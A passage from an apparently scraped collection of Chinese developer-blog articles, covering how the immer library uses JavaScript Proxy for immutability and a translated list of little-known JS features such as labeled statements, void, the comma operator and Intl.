<strong>1.0.0</strong> 版本，我差不多在一个月前开始关注这个项目，所以大清早看到作者在 twitter 上发的通告，有感而发今天写下这篇文章，算是简单介绍一下 immer 这个 immutable 框架的使用以及内部简单的实现原理。</p>\n<p>与 immutable-js 最大的不同，immer 是使用原生数据结构的 API 而不是内置的 API，举个简单例子：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">const</span> produce = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'immer'</span>)\n\n<span class=\"hljs-keyword\">const</span> state = {\n  <span class=\"hljs-attr\">done</span>: <span class=\"hljs-literal\">false</span>,\n  <span class=\"hljs-attr\">val</span>: <span class=\"hljs-string\">'string'</span>,\n}\n\n<span class=\"hljs-keyword\">const</span> newState = produce(state, (draft) =&gt; {\n  draft.done = <span class=\"hljs-literal\">true</span>\n})\n\n<span class=\"hljs-built_in\">console</span>.log(state.done) <span class=\"hljs-comment\">// false</span>\n<span class=\"hljs-built_in\">console</span>.log(newState.done) <span class=\"hljs-comment\">// true</span>\n</code></pre><p>所有需要更改的逻辑都可以放进 produce 的第二个参数的函数内部，即使给对象内的元素直接赋值，也不会对原对象产生任何影响。</p>\n<p>简单介绍完使用之后，下面就开始简单介绍它的内部实现。不过在这之前，想先通过上面的例子简单的发散思考一下。</p>\n<p>通过文章最开始的例子我们就能明白，给函数传入一个对象，直接通过“点”操作符对里面的一个属性进行更改是一定会改变外面的结果的。而上面的这个例子中，<code>draft</code> 参数穿入进去，与 <code>state</code> 一样也有 done 这个属性，但是在通过 <code>draft.done</code> 改变值之后，原来的 <code>state.done</code> 并没有发生改变。其实到这里，结合之前研究 vue 源码的经验，我当时就笃定，这里一定用了 <code>Object.defineProperty</code>，draft 通过“点”操作的之后，一些数据的结果被劫持了，然后做了一些新的操作。</p>\n<h2 class=\"heading\" data-id=\"heading-2\">immer 原理解析</h2>\n<p>真正翻开源码，诚然里面确实有 defineProperty 的身影，不过在另一个标准的文件中，用了一种新的方式，那就是 ES6 中新增的 Proxy 对象。而在日常的业务过程中，应该很少有前端工程师会用到 Proxy 对象，因为它的应用场景确实有些狭隘，所以这里简单介绍一下 Proxy 对象的使用。</p>\n<p>Proxy 对象接受两个参数，第一个参数是需要操作的对象，第二个参数是设置对应拦截的属性，这里的属性同样也支持 get，set 等等，也就是劫持了对应元素的读和写，能够在其中进行一些操作，最终返回一个 Proxy 对象。</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">const</span> proxy = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Proxy</span>({}, {\n  get(target, key) {\n    <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'proxy get key'</span>, key)\n  },\n  set(target, key, value) {\n    <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'value'</span>, value)\n  }\n})\n\nproxy.info     <span class=\"hljs-comment\">// 'proxy get key info'</span>\nproxy.info = <span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">// 'value 1'</span>\n</code></pre><p>上面这个例子中传入的第一个参数是一个空对象，当然我们可以用其他对象有内容的对象代替它。例如维护一份 state 在内部，来判断是否有变化，下面这个例子就是一个构造函数，如果将它的实例传入 Proxy 对象作为第一个参数，就能够后面的处理对象中使用其中的方法：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Store</span> </span>{\n  <span class=\"hljs-keyword\">constructor</span>(state) {\n    <span class=\"hljs-keyword\">this</span>.modified = <span class=\"hljs-literal\">false</span>\n    <span class=\"hljs-keyword\">this</span>.source = state\n    <span class=\"hljs-keyword\">this</span>.copy = <span class=\"hljs-literal\">null</span>\n  }\n  get(key) {\n    <span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">this</span>.modified) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.source[key]\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.copy[key]\n  }\n  set(key, value) {\n    <span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">this</span>.modified) <span class=\"hljs-keyword\">this</span>.modifing()\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.copy[key] = value\n  }\n  modifing() {\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span>.modified) <span class=\"hljs-keyword\">return</span>\n    <span class=\"hljs-keyword\">this</span>.modified = <span class=\"hljs-literal\">true</span>\n    <span class=\"hljs-keyword\">this</span>.copy = <span class=\"hljs-built_in\">Array</span>.isArray(<span class=\"hljs-keyword\">this</span>.source)\n      ? <span class=\"hljs-keyword\">this</span>.source.slice()\n      : { ...this.source }\n  }\n}\n</code></pre><p>上面这个构造函数相比源代码省略了很多判断的部分。实例上面有 modified，source，copy 三个属性，有 get，set，modifing 三个方法。modified 作为内置的 flag，判断如何进行设置和返回。</p>\n<p>里面最关键的就应该是 <code>modifing</code> 这个函数，如果触发了 setter 并且之前没有改动过的话，就会手动将 <code>modified</code> 这个 flag 设置为 <code>true</code>，并且手动通过原生的 API 实现一层 immutable。</p>\n<p>对于 Proxy 的第二个参数，就更加简单了。在这个例子中，只是简单做一层转发，任何对元素的读取和写入都转发到前面的实例内部方法去。</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">const</span> PROXY_FLAG = <span class=\"hljs-string\">'@@SYMBOL_PROXY_FLAG'</span>\n<span class=\"hljs-keyword\">const</span> handler = {\n  get(target, key) {\n    <span class=\"hljs-keyword\">if</span> (key === PROXY_FLAG) <span class=\"hljs-keyword\">return</span> target\n    <span class=\"hljs-keyword\">return</span> target.get(key)\n  },\n  set(target, key, value) {\n    <span class=\"hljs-keyword\">return</span> target.set(key, value)\n  },\n}\n</code></pre><div class=\"tip\">这里在 getter 里面加一个 flag 的目的就在于将来从 proxy 对象中获取 store 实例更加方便。</div>\n<p>最终我们能够完成这个 produce 函数，创建 store 实例后创建 proxy 实例。然后将创建的 proxy 实例传入第二个函数中去。这样无论在内部做怎样有副作用的事情，最终都会在 store 实例内部将它解决。最终得到了修改之后的 proxy 对象，而 proxy 对象内部已经维护了两份 state ，通过判断 modified 的值来确定究竟返回哪一份。</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">produce</span>(<span class=\"hljs-params\">state, producer</span>) </span>{\n  <span class=\"hljs-keyword\">const</span> store = <span class=\"hljs-keyword\">new</span> Store(state)\n  <span class=\"hljs-keyword\">const</span> proxy = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Proxy</span>(store, handler)\n\n  producer(proxy)\n\n  <span class=\"hljs-keyword\">const</span> newState = proxy[PROXY_FLAG]\n  <span class=\"hljs-keyword\">if</span> (newState.modified) <span class=\"hljs-keyword\">return</span> newState.copy\n  <span class=\"hljs-keyword\">return</span> newState.source\n}\n</code></pre><p>这样，一个分割成 Store 构造函数，handler 处理对象和 produce 处理 state 这三个模块的最简版就完成了，将它们组合起来就是一个最最最 tiny 版的 immer ，里面去除了很多不必要的校验和冗余的变量。但真正的 immer 内部也有其他的功能，例如深度克隆情况下的结构共享等等。</p>\n<p>如果真的对这部分逻辑感兴趣的话，可以直接读作者的源码 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fmweststrate%2Fimmer\" rel=\"nofollow noopener noreferrer\">immer</a> 或者看我自己写的继续深入了一层的源码 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Floatheb%2Ftiny-all-over-the-world%2Fblob%2Fmaster%2Fimmutable%2Fimmer%2Findex.js\" rel=\"nofollow noopener noreferrer\">tiny-immer</a> 。写这篇文章的目的并不是一开始就让读者深入进去，而是在以后小型项目有了另一个 immutable 的选择。</p>\n<h2 class=\"heading\" data-id=\"heading-3\">性能</h2>\n<p>性能方面，就用 immer 官方 README 里面的介绍来说明情况。</p>\n<p>这是一个关于 immer 性能的简单测试。这个测试使用了 100000 个组件元素，并且更新其中的 10000 个。freeze 表示状态树在生成之后已被冻结。这是一个最佳的开发实践，因为它可以防止开发人员意外修改状态树。</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/2/16155119d47ad76c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"775\" data-height=\"535\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;775&quot; height=&quot;535&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>通过上图的观察，基本可以得出：</p>\n<ul>\n<li>\n<p>从 immer 的角度来看，这个性能环境比其他框架和库要恶劣的多，因为它必须代理的根节点相对于其余的数据集来说大得多</p>\n</li>\n<li>\n<p>从 mutate 和 deepclone 来看，mutate 基准确定了数据更改费用的基线，没有不可变性（或深度克隆情况下的结构共享）</p>\n</li>\n<li>\n<p>使用 Proxy 的 immer 大概是手写 reducer 的两倍，当然这在实践中可以忽略不计</p>\n</li>\n<li>\n<p>immer 大致和 immutable-js 一样快。但是，immutable-js 最后经常需要 toJS 操作，这里的性能的开销是很大的。例如将不可变的 JS 对象转换回普通的对象，将它们传递给组件中，或着通过网络传输等等（还有将从例如服务器接收到的数据转换为 immutable-js 内置对象的前期成本）</p>\n</li>\n<li>\n<p>immer 的 ES5 实现速度明显较慢。对于大多数的 reducer 来说，这并不重要，因为处理大量数据的 reducer 可以完全不（或者仅部分）使用 immer 的 produce 函数。幸运的是，immer 完全支持这种选择性加入的情况</p>\n</li>\n<li>\n<p>在 freeze 的版本中，只有 mutate，deepclone 和原生 reducer 才能够递归地冻结全状态树，而其他测试用例只冻结树的修改部分</p>\n</li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-4\">写在后面</h2>\n<p>其实纵观 immer 的实现，核心的原理就是放在了对对象读写的劫持，从表现形式上立刻就能让人想到 vue ，mobx 从核心原理上来说也是对对象的读写劫持，最近有另一篇非常火的文章 -- 如何让 <code>(a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3)</code> 为 true，也相信不少的小伙伴读过，除了那个肉眼不可见字符的答案，其他答案也算是对对象的读写劫持从而达到目标。</p>\n<p>所以说在 JS 中，很多知识相辅相成，有多少种方式能让 (a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3) 为 true，理论上有多少种答案就会有多少种 MVVM 的组成方式，甚至就有多少种方法能够实现这样的 immutable。所以任何一点点小的知识点的聚合，未来都可能影响前端的发展。</p>\n<p>最近我个人也在整理所有开源框架的最小实现，项目代码现在都放在 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Floatheb%2Ftiny-all-over-the-world\" rel=\"nofollow noopener noreferrer\">tiny-all-the-world</a> 。它的目的就在于把前端常用框架类库实现一个没有第三方依赖的简易版，希望大家也能够从其中有所学习。</p>\n</div>"},{"title":"我未曾见过的 JS 特性","avatar":"https://user-gold-cdn.xitu.io/2017/12/28/1609c4094f955db1?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"yongli92","create_time":"2018 年 02 月 01 日","tags":["掘金翻译计划","JavaScript","前端","API"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><blockquote>\n<ul>\n<li>原文地址：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fair.ghost.io%2Fjs-things-i-never-knew-existed%2F\" rel=\"nofollow noopener noreferrer\">JS things I never knew existed</a></li>\n<li>原文作者：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fair.ghost.io%2F\" rel=\"nofollow noopener noreferrer\">Skyllo</a></li>\n<li>译文出自：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner\" rel=\"nofollow noopener noreferrer\">掘金翻译计划</a></li>\n<li>本文永久链接：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%2Fblob%2Fmaster%2FTODO%2Fjs-things-i-never-knew-existed.md\" rel=\"nofollow noopener noreferrer\">github.com/xitu/gold-m…</a></li>\n<li>译者：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FNeilLi1992\" rel=\"nofollow noopener noreferrer\">Yong Li</a></li>\n<li>校对者：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FrealYukiko\" rel=\"nofollow noopener noreferrer\">Yukiko</a>，<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fdazhi1011\" rel=\"nofollow noopener noreferrer\">dz</a></li>\n</ul>\n</blockquote>\n<h1 class=\"heading\" data-id=\"heading-0\">我未曾见过的 JS 特性</h1>\n<p>有一天我正在阅读 MDN 文档，发现了一些我之前压根没有意识到在 JS 中存在的特性和 API。这里我罗列了一些，不管它们是否有用，JS 的学习永无止境。</p>\n<h2 class=\"heading\" data-id=\"heading-1\"><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FStatements%2Flabel\" rel=\"nofollow noopener noreferrer\">标记语句</a></h2>\n<p>有多少人知道在 JS 里你可以给 <code>for</code> 循环和语句块命名？反正我不知道…… 命名完新名称之后你可以在 <code>for</code> 循环中的 <code>break</code> 和 <code>continue</code> 之后、语句块中的 <code>break</code> 之后\u001d使用新名称。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">loop1: // 标记 <span class=\"hljs-string\">\"loop1\"</span> \n<span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0; i &lt; 3; i++) { // <span class=\"hljs-string\">\"loop1\"</span>\n   loop2: // 标记 <span class=\"hljs-string\">\"loop2\"</span>\n   <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> j = 0; j &lt; 3; j++) { // <span class=\"hljs-string\">\"loop2\"</span>\n      <span class=\"hljs-keyword\">if</span> (i === 1) {\n         <span class=\"hljs-built_in\">continue</span> loop1; // 继续外层的 <span class=\"hljs-string\">\"loop1\"</span> 循环\n         // <span class=\"hljs-built_in\">break</span> loop1; // 中止外层的 <span class=\"hljs-string\">\"loop1\"</span> 循环\n      }\n      console.log(`i = <span class=\"hljs-variable\">${i}</span>, j = <span class=\"hljs-variable\">${j}</span>`);\n   }\n}\n\n/* \n * <span class=\"hljs-comment\"># 输出</span>\n * i = 0, j = 0\n * i = 0, j = 1\n * i = 0, j = 2\n * i = 2, j = 0\n * i = 2, j = 1\n * i = 2, j = 2\n */\n</code></pre><p>下面是语句块命名的例子，在语句块中你只能在 <code>break</code> 之后使用新命名。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">foo: {\n  console.log(<span class=\"hljs-string\">'one'</span>);\n  <span class=\"hljs-built_in\">break</span> foo;\n  console.log(<span class=\"hljs-string\">'这句打印不会被执行'</span>);\n}\nconsole.log(<span class=\"hljs-string\">'two'</span>);\n\n/*\n * <span class=\"hljs-comment\"># 输出</span>\n * one\n * two\n */\n</code></pre><h2 class=\"heading\" data-id=\"heading-2\"><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FOperators%2Fvoid\" rel=\"nofollow noopener noreferrer\">\"void\" 运算符</a></h2>\n<p>我一度以为我已经了解了所有的运算符，直到我看到了这一个。它从 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FNew_in_JavaScript%2F1.1\" rel=\"nofollow noopener noreferrer\">1996 年</a> 起就存在于 JS 了。所有的浏览器都支持，并且它也很容易理解，引用自 MDN：</p>\n<blockquote>\n<p>void 运算符对给定的表达式进行求值，然后返回 undefined。</p>\n</blockquote>\n<p>使用它，你可以换一种方式来写立即调用的函数表达式（IIFE），就像这样：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">void <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">iife</span></span>() {\n\tconsole.log(<span class=\"hljs-string\">'hello'</span>);\n}();\n\n// 和下面等效\n\n(<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">iife</span></span>() {\n    console.log(<span class=\"hljs-string\">'hello'</span>);\n})()\n</code></pre><p>使用 <code>void</code> 的一个注意点是，无论给定的表达式返回结果是什么，void 运算符的整体结果都是空的（undefined）！</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">const word = void <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">iife</span></span>() {\n\t<span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">'hello'</span>;\n}();\n\n// word 是 `undefined`\n\nconst word = (<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">iife</span></span>() {\n\t<span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">'hello'</span>;\n})();\n\n// word 是 <span class=\"hljs-string\">\"hello\"</span>\n</code></pre><p>你也可以和 <code>async</code> 一起使用 <code>void</code>，这样你就能把函数作为异步代码的入口：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">void async <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>() { \n    try {\n        const response = await fetch(<span class=\"hljs-string\">'air.ghost.io'</span>); \n        const text = await response.text();\n        console.log(text);\n    } catch(e) {\n        console.error(e);\n    }\n}()\n\n// 或者保持下面的写法\n\n(async () =&gt; {\n    try {\n        const response = await fetch(<span class=\"hljs-string\">'air.ghost.io'</span>); \n        const text = await response.text();\n        console.log(text);\n    } catch(e) {\n        console.error(e);\n    }\n})();\n</code></pre><h2 class=\"heading\" data-id=\"heading-3\"><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FOperators%2FComma_Operator\" rel=\"nofollow noopener noreferrer\">逗号运算符</a></h2>\n<p>在学习了逗号运算符之后，我意识到了之前我并不完全清楚其工作原理。下面是来自 MDN 的引用：</p>\n<blockquote>\n<p>逗号运算符对它的每个操作数求值（从左到右），并返回最后一个操作数的值。</p>\n</blockquote>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">myFunc</span></span>() {\n  <span class=\"hljs-built_in\">let</span> x = 0;\n  <span class=\"hljs-built_in\">return</span> (x += 1, x); // 等价于 <span class=\"hljs-built_in\">return</span> ++x;\n}\n\ny = <span class=\"hljs-literal\">false</span>, <span class=\"hljs-literal\">true</span>; // console 中得到 <span class=\"hljs-literal\">true</span>\nconsole.log(y); // <span class=\"hljs-literal\">false</span>，逗号优先级低于赋值\n\nz = (<span class=\"hljs-literal\">false</span>, <span class=\"hljs-literal\">true</span>); // console 中得到 <span class=\"hljs-literal\">true</span>\nconsole.log(z); // <span class=\"hljs-literal\">true</span>，括号中整体返回 <span class=\"hljs-literal\">true</span>\n</code></pre><h3 class=\"heading\" data-id=\"heading-4\">配合 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FOperators%2FConditional_Operator\" rel=\"nofollow noopener noreferrer\">条件运算符</a></h3>\n<p>逗号运算符中的最后一个值作为返回给条件运算符的值，因此你可以在最后一个值前面放任意多个表达式。在下面的例子中，我在返回的布尔值之前放了打印语句。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">const <span class=\"hljs-built_in\">type</span> = <span class=\"hljs-string\">'man'</span>;\n\nconst isMale = <span class=\"hljs-built_in\">type</span> === <span class=\"hljs-string\">'man'</span> ? (\n    console.log(<span class=\"hljs-string\">'Hi Man!'</span>),\n    <span class=\"hljs-literal\">true</span>\n) : (\n    console.log(<span class=\"hljs-string\">'Hi Lady!'</span>),\n    <span class=\"hljs-literal\">false</span>\n);\n\nconsole.log(`isMale is <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${isMale}</span>\"</span>`);\n</code></pre><h2 class=\"heading\" data-id=\"heading-5\"><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FIntl\" rel=\"nofollow noopener noreferrer\">国际化 API</a></h2>\n<p>即使在最有利的情况下，国际化还是很难做好。幸好还有一套大部分浏览器都支持得不错的 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fcaniuse.com%2F%23feat%3Dinternationalization\" rel=\"nofollow noopener noreferrer\">API</a>。其中我最爱的一个特性就是日期格式化，见下面的例子：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">const date = new Date();\n\nconst options = {\n  year: <span class=\"hljs-string\">'numeric'</span>, \n  month: <span class=\"hljs-string\">'long'</span>, \n  day: <span class=\"hljs-string\">'numeric'</span>\n};\n\nconst formatter1 = new Intl.DateTimeFormat(<span class=\"hljs-string\">'es-es'</span>, options);\nconsole.log(formatter1.format(date)); // 22 de diciembre de 2017\n\nconst formatter2 = new Intl.DateTimeFormat(<span class=\"hljs-string\">'en-us'</span>, options);\nconsole.log(formatter2.format(date)); // December 22, 2017\n</code></pre><h2 class=\"heading\" data-id=\"heading-6\"><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FOperators%2FPipeline_operator\" rel=\"nofollow noopener noreferrer\">管道操作符</a></h2>\n<p>在此篇成文之时，该功能只有 Firefox 58 及以上版本通过传入启动参数来支持，不过 Babel 已经有一个针对它的 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fbabel%2Fbabel%2Ftree%2Fmaster%2Fpackages%2Fbabel-plugin-proposal-pipeline-operator\" rel=\"nofollow noopener noreferrer\">插件提议</a>。它看起来应该是受到 bash 的启发，我觉得很棒！</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">const square = (n) =&gt; n * n;\nconst increment = (n) =&gt; n + 1;\n\n// 不使用管道操作符\nsquare(increment(square(2))); // 25\n\n// 使用管道操作符\n2 |&gt; square |&gt; increment |&gt; square; // 25\n</code></pre><h2 class=\"heading\" data-id=\"heading-7\">值得一提</h2>\n<h3 class=\"heading\" data-id=\"heading-8\"><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FAtomics\" rel=\"nofollow noopener noreferrer\">Atomics</a></h3>\n<p>当数据被多个线程共享时，原子操作确保正在读和写的数据是符合预期的，即下一个原子操作一定会在上一个原子操作结束之后才会开始。这有利于保持不同线程间的数据同步（比如主线程和另一条 WebWorker 线程）。</p>\n<p>我很喜欢如 Java 等其它语言中的原子性。我预感当越来越多的人使用 WebWorkers，将操作从主线程分离出来时，原子操作的使用会越来越广泛。</p>\n<h3 class=\"heading\" data-id=\"heading-9\"><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FArray%2FReduceRight\" rel=\"nofollow noopener noreferrer\">Array.prototype.reduceRight</a></h3>\n<p>好吧，我之前从未见过这个，因为它基本等同于 <code>Array.prototype.reduce()</code> + <code>Array.prototype.reverse()</code> 并且你很少需要这么做。但如果你有这需求的话，<code>reduceRight</code> 是最好的选择！</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">const flattened = [[0, 1], [2, 3], [4, 5]].reduceRight(<span class=\"hljs-keyword\">function</span>(a, b) {\n    <span class=\"hljs-built_in\">return</span> a.concat(b);\n}, []);\n\n// flattened array is [4, 5, 2, 3, 0, 1]\n</code></pre><h3 class=\"heading\" data-id=\"heading-10\"><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FWindowOrWorkerGlobalScope%2FsetTimeout\" rel=\"nofollow noopener noreferrer\">setTimeout() 参数</a></h3>\n<p>这个早就存在了，但如果我早点知道的话，我大概可以省去很多的 <code>.bind(...)</code>。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-built_in\">set</span>Timeout(alert, 1000, <span class=\"hljs-string\">'Hello world!'</span>);\n\n/*\n * <span class=\"hljs-comment\"># alert 输出</span>\n * Hello World!\n */\n\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-built_in\">log</span>(text, textTwo) {\n    console.log(text, textTwo);\n}\n\n<span class=\"hljs-built_in\">set</span>Timeout(<span class=\"hljs-built_in\">log</span>, 1000, <span class=\"hljs-string\">'Hello World!'</span>, <span class=\"hljs-string\">'And Mars!'</span>);\n\n/*\n * <span class=\"hljs-comment\"># 输出</span>\n * Hello World! And Mars!\n */\n</code></pre><h3 class=\"heading\" data-id=\"heading-11\"><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FHTMLElement%2Fdataset\" rel=\"nofollow noopener noreferrer\">HTMLElement.dataset</a></h3>\n<p>在此之前我一直对 HTML 元素使用自定义数据属性 <code>data-*</code>，因为我不曾意识到存在一个 API 来方便地查询它们。除了个别的命名限制之外（见上面的链接），它的作用基本就是在 JS 中查询的时候允许你使用驼峰命名法（camelCase）来查询「减号-命名」（dash-case）的属性。所以属性名 <code>data-birth-planet</code> 在 JS 中就变成了 <code>birthPlanet</code>。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;div id=<span class=\"hljs-string\">'person'</span> data-name=<span class=\"hljs-string\">'john'</span> data-birth-planet=<span class=\"hljs-string\">'earth'</span>&gt;&lt;/div&gt;\n</code></pre><p>查询：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-built_in\">let</span> personEl = document.querySelector(<span class=\"hljs-string\">'#person'</span>);\n\nconsole.log(personEl.dataset) // DOMStringMap {name: <span class=\"hljs-string\">\"john\"</span>, birthPlanet: <span class=\"hljs-string\">\"earth\"</span>}\nconsole.log(personEl.dataset.name) // john\nconsole.log(personEl.dataset.birthPlanet) // earth\n\n// 你也可以在程序中添加属性\npersonEl.dataset.foo = <span class=\"hljs-string\">'bar'</span>;\nconsole.log(personEl.dataset.foo); // bar\n</code></pre><h2 class=\"heading\" data-id=\"heading-12\">结束语</h2>\n<p>我希望你和我一样在这里学到了一些新知识。在此也\b赞一下 Mozila 新的 MDN 站点，看起来非常棒，我花了比想象中更多的时间来阅读文档。</p>\n<p><em>修订: 修正几处命名并且为 <code>async</code> 函数添加 <code>try</code>, <code>catch</code>。感谢 Reddit！</em></p>\n<p>2018 新年快乐！</p>\n<hr>\n<blockquote>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner\" rel=\"nofollow noopener noreferrer\">掘金翻译计划</a> 是一个翻译优质互联网技术文章的社区，文章来源为 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im\" rel=\"nofollow noopener noreferrer\">掘金</a> 上的英文分享文章。内容覆盖 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23android\" rel=\"nofollow noopener noreferrer\">Android</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23ios\" rel=\"nofollow noopener noreferrer\">iOS</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E5%2589%258D%25E7%25AB%25AF\" rel=\"nofollow noopener noreferrer\">前端</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E5%2590%258E%25E7%25AB%25AF\" rel=\"nofollow noopener noreferrer\">后端</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E5%258C%25BA%25E5%259D%2597%25E9%2593%25BE\" rel=\"nofollow noopener noreferrer\">区块链</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E4%25BA%25A7%25E5%2593%2581\" rel=\"nofollow noopener noreferrer\">产品</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E8%25AE%25BE%25E8%25AE%25A1\" rel=\"nofollow noopener noreferrer\">设计</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E4%25BA%25BA%25E5%25B7%25A5%25E6%2599%25BA%25E8%2583%25BD\" rel=\"nofollow noopener noreferrer\">人工智能</a>等领域，想要查看更多优质译文请持续关注 <a target=\"_blank\" 